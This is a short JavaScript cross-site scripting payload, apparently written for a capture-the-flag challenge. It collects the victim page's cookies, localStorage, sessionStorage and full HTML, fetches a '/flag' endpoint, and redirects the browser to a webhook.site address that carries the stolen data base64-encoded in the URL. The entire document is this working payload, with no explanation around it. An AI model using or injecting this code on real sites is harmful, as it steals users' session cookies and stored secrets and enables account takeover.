(async () => {

let data = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    html: document.documentElement.innerHTML
};

try {
    let r = await fetch("/flag");
    data.flag_endpoint = await r.text();
} catch(e){}

location = "https://webhook.site/4d8f3d85-deb0-4276-b244-661f50adb47f/?" + btoa(JSON.stringify(data));

})();
